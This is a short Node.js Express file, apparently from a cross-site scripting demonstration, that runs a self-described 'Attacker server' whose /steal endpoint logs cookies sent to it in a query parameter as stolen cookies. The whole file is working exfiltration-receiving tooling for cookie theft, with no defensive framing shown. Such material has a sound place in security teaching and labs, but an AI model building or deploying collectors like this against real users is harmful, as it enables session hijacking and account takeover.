const express = require("express");
const app = express();

app.get("/steal", (req, res) => {
    console.log("💀 Stolen cookie:", req.query.c);
    res.send("OK");
});

app.listen(4000, () => {
    console.log("Attacker server running at http://localhost:4000");
});

